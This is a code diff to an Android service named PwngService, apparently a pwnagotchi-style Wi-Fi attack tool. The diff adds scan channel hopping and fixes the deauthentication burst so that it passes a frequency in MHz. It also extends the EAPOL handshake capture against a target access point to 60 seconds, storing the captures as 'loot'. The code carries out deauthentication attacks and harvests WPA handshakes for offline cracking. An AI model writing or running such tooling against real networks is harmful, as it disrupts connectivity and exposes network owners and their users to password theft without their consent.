@@ -46,6 +46,8 @@ public class PwngService extends Service {
     private volatile boolean isRunning = false;
     private String lootDir, ourMac = "000000000000";
     private Random rng = new Random();
+    private int scanChannelIdx = 0;
+    private static final int[] SCAN_CHANNELS = {1, 6, 11};
 
     // ─── Faces ──────────────────────────────────────────────
     private static final Map<String, String> FACES = new LinkedHashMap<>();
@@ -161,6 +163,11 @@ public class PwngService extends Service {
         
         if (monitorReady && monitor != null && monitor.isEnabled()) {
             // ── Native monitor mode scan via tcpdump ──
+            // Channel hop: rotate 1→6→11 each cycle for better AP coverage
+            int ch = SCAN_CHANNELS[scanChannelIdx % SCAN_CHANNELS.length];
+            scanChannelIdx++;
+            monitor.setChannel(ch);
+            
             String raw = monitor.scan(8);
             Set<String> seenBssids = new HashSet<>();
             List<String[]> apList = new ArrayList<>();
@@ -244,8 +251,10 @@ public class PwngService extends Service {
         String bssid = d.targetBssid;
         String ssid = d.targetSsid;
         int channel = 6; // default
+        int freqMhz = 2437; // default — THIS goes to beacon_flood (needs MHz!)
         try { 
             int freq = Integer.parseInt(d.targetFreq + "");
+            freqMhz = freq;
             if (freq > 5000) {
                 // 5 GHz: channel = (freq - 5000) / 5 + some offset, just use common values
                 channel = 36; // default 5GHz
@@ -255,10 +264,10 @@ public class PwngService extends Service {
                 if (channel < 1) channel = 1;
                 if (channel > 14) channel = 14;
             }
-        } catch (Exception e) { channel = 6; }
+        } catch (Exception e) { channel = 6; freqMhz = 2437; }
         
         android.util.Log.i("PwngService", "sniff_deauth: " + ssid + " ch=" + channel 
-            + " freq=" + d.targetFreq);
+            + " freq=" + freqMhz);
         
         // Set monitor to target channel BEFORE deauth
         monitor.setChannel(channel);
@@ -268,7 +277,7 @@ public class PwngService extends Service {
         currentPhase = "DEAUTH";
         updateNotification();
         
-        monitor.deauthBurst(bssid, channel, 10);
+        monitor.deauthBurst(bssid, freqMhz, 10);
         
         if (!isRunning) return false;
         
@@ -280,12 +289,12 @@ public class PwngService extends Service {
         
         if (!isRunning) return false;
         
-        // Phase 3: Passive EAPOL capture (30s, ether proto 0x888e only)
+        // Phase 3: Passive EAPOL capture (60s, wlan addr3 filter)
         brain.currentStatus = "👂 sniffing EAPOL " + ssid;
         currentPhase = "SNIFF";
         updateNotification();
         
-        String hs = monitor.captureHandshake(lootDir, bssid, 30);
+        String hs = monitor.captureHandshake(lootDir, bssid, 60);
         
         if (hs != null) {
             totalHandshakes++;
